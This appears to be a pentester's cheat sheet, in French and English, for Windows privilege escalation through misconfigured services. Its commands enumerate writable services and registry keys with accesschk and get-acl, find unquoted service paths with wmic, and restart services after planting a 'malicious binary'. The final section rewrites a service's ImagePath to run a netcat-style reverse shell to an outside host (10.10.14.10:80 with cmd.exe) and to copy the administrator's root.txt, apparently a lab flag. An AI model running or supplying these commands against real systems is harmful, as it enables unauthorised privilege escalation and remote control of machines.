# services

## check services with write access - to change binpath

## commande de base
accesschk.exe -accepteula -uvwc *

## registry pour les service modifiable par l'user Hector:
./accesschk64.exe "Hector" -kvuqsw hklm:\SYSTEM\CurrentControlSet\services

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *| findstr /i "Hector Users Path"


## Unquoated services

wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """


## Restart service
Okay, so now that we have a malicious binary  in place we need to restart the service so that it gets executed. We  can do this by using wmic or net the following way:

wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name].

## Modifiable from registry

set-itemproperty hklm:\SYSTEM\CurrentControlSet\services\wuauserv -name ImagePath -value 'c:\tmp\titi.exe 10.10.14.10 80 -e cmd.exe'
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d 'copy c:\users\administrator\desktop\root.txt c:\tmp\r.txt' /f

